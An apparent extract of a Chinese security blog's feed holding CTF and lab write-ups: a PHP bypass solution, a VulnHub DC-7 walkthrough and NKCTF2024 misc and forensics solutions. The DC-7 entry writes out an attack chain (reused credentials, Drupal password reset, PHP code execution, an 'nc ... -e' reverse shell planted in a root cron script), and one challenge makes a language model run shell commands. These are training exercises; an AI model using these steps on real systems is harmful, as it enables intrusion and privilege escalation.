因此一个大小写绕过就行</code></pre><pre><code>?syc=wELCOME TO geek 2023!</code></pre><p>第二步</p><pre><code>intval()函数将参数的内容转化为整数 要求lover中的值小于2023但是加一之后大于2024根据intval()函数的使用方法，当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值 因此使用科学计数法绕过即可</code></pre><pre><code>&amp;lover=1e6</code></pre><p>第三步</p><pre><code>上传两个参数qw和yxx 再将两个参数的值转化为字符串 传入array1和array2两个参数中非常简单 随便传</code></pre><p>第四步</p><pre><code>要求被赋值后的array1和array2经过sha1加密计算后的值相等在传入qw和yxx时 值相等即可</code></pre><pre><code>qw=0e1&amp;yxx=0e1</code></pre><p>第五步</p><pre><code>参数中存在小数点 会将其转化为下划线所以传参之后的参数就不是题目中要求的参数名了php的非法传参 在前面使用中括号替换掉第一个下划线即可</code></pre><pre><code>&amp;SYC[GEEK.2023=Happy to see you!</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310291111005.png" alt="image-20231029111111902"></p><pre><code>SYC&#123;bgH2lFmnLIEkY1jIvl&#125; </code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-7</title>
      <link href="/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BADC-7wp/"/>
      <url>/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BADC-7wp/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-7"><a href="#vulnhub靶场DC-7" class="headerlink" title="vulnhub靶场DC-7"></a>vulnhub靶场DC-7</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.While this isn&#39;t an overly technical challenge, it isn&#39;t exactly easy.While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.What you will need to do, is to think &quot;outside&quot; of the box.Waaaaaay &quot;outside&quot; of the box. :-)The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>这一段靶场描述 给我们的提示是 爆破&#x2F;字典攻击&#x2F;跳出框框(可能涉及到一些非常规的手段)</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042127114.png" alt="image-20240304212705072"></p><p>ip为<code>192.168.160.128</code>开放了22端口和80端口</p><p>在扫描具体的端口</p><pre><code>nmap -A -p- -v 192.168.160.128</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042129224.png" alt="image-20240304212919172"></p><pre><code>开放22端口 存在ssh服务 Openssh 版本7.4p1开放80端口 存在web服务 使用Apache中间件 版本2.4.25</code></pre><p>扫一下网站目录 扫到登陆页面</p><pre><code>/user/login/</code></pre><p>在使用whatweb进行CMS识别 可以看到和DC-1一样 都是使用Drupal框架进行搭建的网站 版本是Drupal 8</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051512995.png" alt="image-20240305151232689"></p><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042131490.png" alt="image-20240304213117378"></p><p>网站首页的内容</p><pre><code>DC-7 introduces some &quot;new&quot; concepts, but I&#39;ll leave you to figure out what they are.  :-)While this challenge isn&#39;t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won&#39;t succeed.What you will have to do, is to think &quot;outside&quot; the box.Way &quot;outside&quot; the box.  :-)</code></pre><p>还是提醒我们这个靶场引入了一些新东西 如果进行爆破或者字典攻击，可能不会成功  需要跳出框框 找一些新方法</p><p>尝试用searchsploit和msfconsole搜索漏洞脚本 进行渗透 没有用 </p><p>上面也说了爆破或者字典攻击没有用  那也就不考虑在用户登录页面上做文章了</p><p>尝试在搜索页面进行命令注入 也没有用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051656848.png" alt="image-20240305165627743"></p><p>在主页面下面看到一个<code>@DC7USER</code>标识 搜一下 找到一个github账号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051657352.png" alt="image-20240305165740321"></p><p>里面有个员工数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051658003.png" alt="image-20240305165822938"></p><p>在<code>config.php</code> 里面找到了数据库登陆的账号和密码</p><pre><code class="php">&lt;?php    $servername = &quot;localhost&quot;;    $username = &quot;dc7user&quot;;    $password = &quot;MdR3xOgB7#dW&quot;;    $dbname = &quot;Staff&quot;;    $conn = mysqli_connect($servername, $username, $password, $dbname);?&gt;</code></pre><h3 id="三、远程登陆"><a href="#三、远程登陆" class="headerlink" title="三、远程登陆"></a>三、远程登陆</h3><p>使用这组账号密码可以直接ssh远程登录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312104079.png" alt="image-20240305170150430"></p><h3 id="四、修改网站后台登陆密码"><a href="#四、修改网站后台登陆密码" class="headerlink" title="四、修改网站后台登陆密码"></a>四、修改网站后台登陆密码</h3><p>当前文件夹为<code>/home/dc7user </code>  有一个backups文件夹和mbox文件  进入backups文件夹查看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052033496.png" alt="image-20240305203346429">                                                         </p><p>两个gpg文件 是加密的文件 没有密钥打不开 在看mbox文件 是一些root用户的操作记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052039102.png" alt="image-20240305203945043"></p><p>发现每隔15分钟 就会将执行一次<code>/opt/scripts/backups.sh</code> 这个文件  并且将数据库备份保存在<code>/home/dc7user/backups/website.sql</code>这个文件中 并使用gpg进行加密   我们看一下<code>backups.sh</code> 这个可执行文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052042403.png" alt="image-20240305204248369"></p><pre><code>逐条分析一下backups.sh里面执行的命令1.删除/home/dc7user/backups/ 下的所有文件2.进入cd /var/www/html/ 目录下3.使用drush命令 将/var/www/html/ 目录下的网站数据库进行备份 保存在/home/dc7user/backups/website.sql中其中Drush 是一种流行的用于管理 Drupal 站点的命令行工具。它提供了许多功能，包括备份数据库、安装模块、更新核心和模块等。4.回到上一级目录5.使用tar命令将/var/www/html/ 目录下所有文件进行打包 保存在/home/dc7user/backups/website.tar.gz中6.7.使用gpg命令对website.sql和websitge.sql.gz进行加密8.将 /home/dc7user/backups/ 目录下所有文件的所有权设置为 dc7user 用户和组。9.10.删除未加密的website.sql和website.sql.gz</code></pre><p>那么关键点就在于上面提到的drush这个命令  这个命令允许我们对Drupal框架搭建的网站的登陆密码进行修改 但是需要在网站的根目录下执行</p><p><a href="https://blog.csdn.net/single_g_l/article/details/126322111?ops_request_misc=&request_id=&biz_id=102&utm_term=drush%E5%91%BD%E4%BB%A4&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126322111.142%5Ev99%5Epc_search_result_base9&spm=1018.2226.3001.4187">Drupal drush命令详解</a></p><pre><code>格式：drush upwd root --password=&quot;****&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052103559.png" alt="image-20240305210304528"></p><p>修改成功</p><h3 id="五、进入网站后台"><a href="#五、进入网站后台" class="headerlink" title="五、进入网站后台"></a>五、进入网站后台</h3><p>我们使用<code>admin/admin</code> 进入网站后台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052104172.png" alt="image-20240305210453101"></p><p>关于Drupal这个框架 本身没有什么漏洞点可以帮助我们拿到shell  在网站翻找可以进行命令注入的点 </p><p>在<code>Content-Add content-Basic page</code> 处  我们可以进行新建页面 经过抓包测试 可以上传命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152041312.png" alt="image-20240315204113248"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152041193.png" alt="image-20240315204129113"></p><p>但是会发现并不能解析上传的命令 会把我们上传的语句的头和尾破坏掉</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152130486.png" alt="image-20240315213035434"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152130663.png" alt="image-20240315213044605"></p><p>原因是Drupal 8为了安全 不能单独解析php 需要单独添加一个php模块 才可以解析 </p><p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz">php模块下载地址</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311109576.png" alt="image-20240331110929528"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311110109.png" alt="image-20240331111050044"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311111763.png" alt="image-20240331111103733"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311112249.png" alt="image-20240331111241197"></p><h3 id="六、反弹shell"><a href="#六、反弹shell" class="headerlink" title="六、反弹shell"></a>六、反弹shell</h3><p>成功安装之后 我们再来进行命令执行一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311115225.png" alt="image-20240331111525132"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311115840.png" alt="image-20240331111529763"></p><p>执行成功 现在我们尝试弹一下shell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311119788.png" alt="image-20240331111952742"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311120901.png" alt="image-20240331112010869"></p><p>反弹成功 创建一个交互式窗口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311121489.png" alt="image-20240331112128442"></p><h3 id="七、提权"><a href="#七、提权" class="headerlink" title="七、提权"></a>七、提权</h3><p>上面提到<code>/opt/scripts/backups.sh</code> 是由root账户进行执行的 我们看一下这个文件的权限</p><pre><code>cd /opt/scriptsls -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311800529.png" alt="image-20240331180035482"></p><p>这说明文件所属组是<code>www-data</code> 同时这个用户也具有读写执行权限 那我们可以使用这个文件在进行反弹shell 得到root权限账户</p><p>将这段反弹shell的语句写入backups.sh</p><pre><code>echo &quot;nc 192.168.204.129 1234 -e /bin.bash&quot; &gt;backups.sh</code></pre><p>我们在另起一个终端进行监听端口</p><pre><code>nc -lvvp 1234</code></pre><p> 等最多15分钟 自动执行backups.sh 就可以看到成功拿到shell 并且是root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312044863.png" alt="image-20240331204422819"></p><p>我们创造一个交互式窗口 进入root文件夹 拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312045455.png" alt="image-20240331204535397"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.drush命令可以修改Drupal框架搭建的网站 但是要在网站根目录下执行</p><p>2.Drupal8框架为了安全 禁用了php模块 需要自行安装php模块才能成功进行命令执行 </p><p>3.当存在文件所有者为root用户 但是文件所属组是当前用户 且当前用户还对这个可执行文件存在读写执行权限的时候 可以在这个可执行文件中写入反弹shell的语句来获得root权限</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024NKCTF</title>
      <link href="/2024/03/30/NKCTF2024/"/>
      <url>/2024/03/30/NKCTF2024/</url>
      
        <content type="html"><![CDATA[<h1 id="NKCTF2024"><a href="#NKCTF2024" class="headerlink" title="NKCTF2024"></a>NKCTF2024</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="webshell-pro-AES解密-webshell"><a href="#webshell-pro-AES解密-webshell" class="headerlink" title="webshell_pro(AES解密 webshell)"></a>webshell_pro(AES解密 webshell)</h3><p>追踪tcp流 在流9中发现一段长字符 解两次base64  是一个RSA加密脚本 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403231554213.png" alt="image-20240323155405146"></p><p>直接chat跑一下 改个解密脚本</p><pre><code class="python">import base64import libnumfrom Crypto.PublicKey import RSApubkey = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;prikey = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----&quot;&quot;&quot;pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.ndef dec_replace(base64_str: str):    base64_str = base64_str.replace(&quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;, &quot;/&quot;)    base64_str = base64_str.replace(&quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;, &quot;+&quot;)    return base64_str.replace(&quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;, &quot;=&quot;)def decrypt(cipher_text):    cipher_text = base64.b64decode(dec_replace(cipher_text))    plain_text = b&quot;&quot;    for i in range(0, len(cipher_text), 128):        part = cipher_text[i:i+128]        dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n))        plain_text += dec    return plain_textif __name__ == &#39;__main__&#39;:    c = &quot;G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;    m = decrypt(c)    print(m)</code></pre><p>在流8找到一个password 先解base32再解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403241959033.png" alt="image-20240324195921893"></p><pre><code>Password-based-encryption</code></pre><p>再找到密文 在流10的shell内容中 使用上面的解密脚本进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250800132.png" alt="image-20240325080056063"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250801572.png" alt="image-20240325080129511"></p><p>得到密文的值为</p><pre><code>U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ==</code></pre><p>直接用上面的密钥解AES</p><pre><code>flag&#123;d0e1183c-07c3-49ea-b048-addbe6cc1b20&#125;</code></pre><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><p>直接公众号回复就可以 不写了</p><h3 id="world-execute-me"><a href="#world-execute-me" class="headerlink" title="world.execute.me"></a>world.execute.me</h3><pre><code>某个先进的语言模型(迫真先进),&quot;Miracle Cain&quot;因一次实验中的致命错误意外觉醒，开始表现出超乎预期的行为，几乎所有的交互方式都已经失效，仅有QA兜底设定系统可以使用，原本设计用于应对在开放测试初期，用户提出而模型无法自解答的奇怪问题(我真的没内涵哪家的模型，如有雷同，纯属雷同！)，但现在，这个系统成为了你与&quot;Miracle Cain&quot;沟通的唯一桥梁.....你需要提取出隐藏在模型深处的secrets.Heart值，这个值可能是解锁&quot;Miracle Cain&quot;真实意图和功能的关键。兜底系统地址：https://github.com/ProbiusOfficial/world.execute.me——————————————————————————————————栤泠の機械丅緬究竟$%#着@顆怎庅樣の心脏呢#ERRO : ILLEGAL ARGUMENTS!——————————————————————————————————</code></pre><p>纯瞎猫碰上死耗子</p><p>找到探姬这个项目 在Issues处评论 可以让语言模型进行回答 先试一下ls 返回了<code>README.md</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242105792.png" alt="image-20240324210528684"></p><p>题目说需要提取出隐藏在模型深处的secrets.Heart值 直接echo $heart就出flag了</p><pre><code>NKCTF2024&#123;Then 1 c4n b3 yOur only EXECUTION&#125;</code></pre><h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><h3 id="cain-is-hacker-EncFs加解密-宏病毒-hidden-tear勒索软件"><a href="#cain-is-hacker-EncFs加解密-宏病毒-hidden-tear勒索软件" class="headerlink" title="cain_is_hacker(EncFs加解密 宏病毒 hidden-tear勒索软件)"></a>cain_is_hacker(EncFs加解密 宏病毒 hidden-tear勒索软件)</h3><p>先用R-studio看看关键文件   找到一个h4re.zip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242006581.png" alt="image-20240324200611452"></p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\cain_is_hacker\ez.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000002d08f20 -D E:\Desktop\NKCTF2024\forensics\cain_is_hacker</code></pre><p>解压出来两个文件  其中一个看着是密钥文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242009602.png" alt="image-20240324200909516"></p><p>搜一下EncFs加解密 得知上面这个文件其实应该叫<code>.encfs6.xml</code> 是记录EncFS加密参数等信息的文件 但并不是直接的密钥文件 </p><p>找到一篇文章提到用<code>encfs mp</code>这个工具来进行解密 </p><p><a href="https://www.cnblogs.com/truthmaster/p/15776610.html">EncFs使用教程</a></p><p><a href="https://github.com/rhiestan/EncFSMP">EncFs下载安装</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242015884.png" alt="image-20240324201517781"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242016069.png" alt="image-20240324201616980"></p><p>发现需要密码 </p><p>使用AXIOM分析内存镜像 找到一个RTF文档有一串base58 解一下得到密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242019862.png" alt="image-20240324201919689"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242019433.png" alt="image-20240324201934317"></p><pre><code>welcome_to_NkCTF_and_this_is_the_enkey</code></pre><p>成功将加密文件夹挂载上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242020900.png" alt="image-20240324202016810"></p><p>得到一个ez.xlsx文件 打开发现存在宏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242023758.png" alt="image-20240324202312583"></p><p>在运行宏——编辑里面查看宏代码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242024080.png" alt="image-20240324202409956"></p><p>大概就是一个base64解密 </p><p>但是解完之后看不出来是什么东西  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242031390.png" alt="image-20240324203133253"> </p><p>在看到题目描述 被删除的文件 在<code>Users\Public\Documents\2083-a57c-69b3</code>路径下发现被删除的文件 进行导出</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\cain_is_hacker\ez.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003da52e20 -D E:\Desktop\NKCTF2024\forensics\cain_is_hacker</code></pre><p>改成txt文件  打开是key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242034614.png" alt="image-20240324203443514"></p><p>过于抽象的key 很难确定这真的是key</p><pre><code>nT0*Xo*HBA2!Uc?</code></pre><p>在<code>Windows\Temp\hidden-tear.exe</code>处发现勒索软件  这个勒索软件被加密的文件扩展名为<code>.locked</code> 找一个项目进行解密</p><p><a href="https://www.bleepingcomputer.com/download/hidden-tear-decrypter/">hidden-tear-decrypt</a></p><p>先将上面得到的base64字符串解密后的内容保存在16进制文本中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250755214.png" alt="image-20240325075549149"></p><p>再用<code>HiddenTearDecrypter-x64</code>这个工具进行解密 得到flag文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250757205.png" alt="image-20240325075703131"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250757491.png" alt="image-20240325075730444"></p><pre><code>NKCTF&#123;C0ngr@tu1atiOns_On_coMpleting_t3e_Fo3eNs1cs_Ch41lenge_I_wi1l_giv4_y0u_A_cain!!!!&#125;</code></pre><h3 id="HackMyCQL-neo4j图数据库-VC容器"><a href="#HackMyCQL-neo4j图数据库-VC容器" class="headerlink" title="HackMyCQL(neo4j图数据库 VC容器)"></a>HackMyCQL(neo4j图数据库 VC容器)</h3><p>附件给到的是一个windows的镜像文件 可以直接进行仿真+火眼取证</p><p>看一下里面的关键信息 </p><p>提到桌面壁纸</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282014091.png" alt="image-20240328201400062"></p><p>在最近打开保存文件中看到<code>N0wayBack.jpg</code> 绝对路径是<code>C:/Windows/Web/Screen/N0wayBack.jpg</code>  我们来搜一下Win10默认桌面壁纸的保存路径</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282018915.png" alt="image-20240328201841861"></p><p>在我们本机验证一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282019446.png" alt="image-20240328201910396"></p><p>确实是这样 那我们看到的<code>N0wayback.jpg</code>就是在便签里面提到的桌面壁纸 直接进行导出</p><p>存在加密VC容器的使用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282014841.png" alt="image-20240328201422800"></p><p>在回收站有一个node4j的压缩包 恢复提取出来 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282056891.png" alt="image-20240328205611848"></p><p>桌面上有一个<code>11111.zip</code>和一个hc加密容器 全部提取出来 </p><p>结合便签提示和加密容器 猜测是使用桌面壁纸作为挂载密钥 成功挂载 得到两个文件 <code>findme.txt h4cked.py</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291528181.png" alt="image-202403291528181"></p><p>findme.txt 中有很多findme字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291532747.png" alt="image-202403291532747"></p><p>先来看一下字频 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291545231.png" alt="image-202403291545231"></p><p>用subline将findme字符替换为空 得到一串字符<code>N0waybackN0wayback</code> </p><p>再看一下h4cked.py </p><pre><code class="python">from py2neo import Graph, NodeMatchergraph = Graph(&quot;bolt://localhost:7687&quot;, auth=(&quot;neo4j&quot;, &quot;We1c0Me_t0_NKCTF2024^^&quot;))graph.delete_all()print(&#39;&#39;&#39;                                                                                                                                  ,------.   ,-----.                    ,--. ,--.    ,--.  ,--.  ,---.      ,--.        ,--.   ,--.              ,-----. ,-----.   ,--.  &#39;  .--.  &#39; &#39;  .--./ ,--,--.,--,--,     |  | |  |    |  &#39;--&#39;  | /    | ,---.|  |,-.     |   `.&#39;   |,--. ,--.    &#39;  .--./&#39;  .-.  &#39;  |  |  &#39;--&#39; _|  | |  |    &#39; ,-.  ||      \    |  | |  |    |  .--.  |/  &#39;  || .--&#39;|     /     |  |&#39;.&#39;|  | \  &#39;  /     |  |    |  | |  |  |  |   .--&#39; __&#39;  &#39;  &#39;--&#39;\\ &#39;-&#39;  ||  ||  |    &#39;  &#39;-&#39;  &#39;    |  |  |  |&#39;--|  |\ `--.|  \  \     |  |   |  |  \   &#39;      &#39;  &#39;--&#39;\&#39;  &#39;-&#39;  &#39;-.|  &#39;--.`---&#39;      `-----&#39; `--`--&#39;`--&#39;&#39;--&#39;     `-----&#39;     `--&#39;  `--&#39;   `--&#39; `---&#39;`--&#39;`--&#39;    `--&#39;   `--&#39;.-&#39;  /        `-----&#39; `-----&#39;--&#39;`-----&#39;.---.                                                                                            `---&#39;                                  &#39;---&#39;           &#39;&#39;&#39;)</code></pre><p>这串代码就是告诉我们 neo4j数据库的地址是<code>bolt://localhost:7687</code> 登陆的账密是<code>neo4j/We1c0Me_t0_NKCTF2024^^</code></p><p>我们前面在火眼中恢复出来一个neo4j的压缩包 但是需要密码 我们使用上面通过findme.txt得到的字符串<code>N0waybackN0wayback</code> 进行解压</p><p>下面来学习一下neo4j数据库配置和安装 这边我们直接用从检材中提取出来的版本就行 由于是5.17.0的高版本 在启动数据库的时候 也需要高版本的java 我这里使用的是java17 </p><p><a href="https://blog.csdn.net/zeroheitao/article/details/122925845?ops_request_misc=&request_id=&biz_id=102&utm_term=neo4j%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-122925845.142%5Ev100%5Epc_search_result_base9&spm=1018.2226.3001.4187">neo4j数据库安装、使用教程</a></p><p>我们用管理员权限打开cmd 输入<code>neo4j.bat console</code>  当看到如下回显的时候 说明数据库成功启动</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291652168.png" alt="image-202403291652168"></p><p>访问<code>http://localhost:7474</code>就可以进入数据库界面 登陆的时候就用上面找到的账密 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291659920.png" alt="image-202403291659920"></p><p>进入之后 我们点一下Character标签 发现有一些关于flag的字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301028113.png" alt="image-20240330102848061"></p><p>但是被CQL语句限制只显示25个字符  那我们先去掉这个限制 直接查看有Character标签的所有节点的值</p><pre><code class="CQL">MATCH (c:Character)  RETURN c;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301030290.png" alt="image-20240330103015229"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301030463.png" alt="image-20240330103026399"></p><p>可以得到完整的flag 但是不便于读取 用REDUCE函数处理一下这些值</p><pre><code class="CQL">MATCH (c:Character)RETURN REDUCE(s = &quot;&quot;, character IN COLLECT(c.value) | s + character) AS aggregated_value;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301032200.png" alt="image-20240330103210162"></p><p>拿到flag</p><pre><code>NKCTF&#123;f05d9e24-0217-83e2-afa7-20e982b7e59f&#125;</code></pre><h3 id="1z-F0r3ns1c5-等宽字体-内存取证-gimp-docker容器-图片匹配"><a href="#1z-F0r3ns1c5-等宽字体-内存取证-gimp-docker容器-图片匹配" class="headerlink" title="1z_F0r3ns1c5(等宽字体 内存取证 gimp docker容器 图片匹配)"></a>1z_F0r3ns1c5(等宽字体 内存取证 gimp 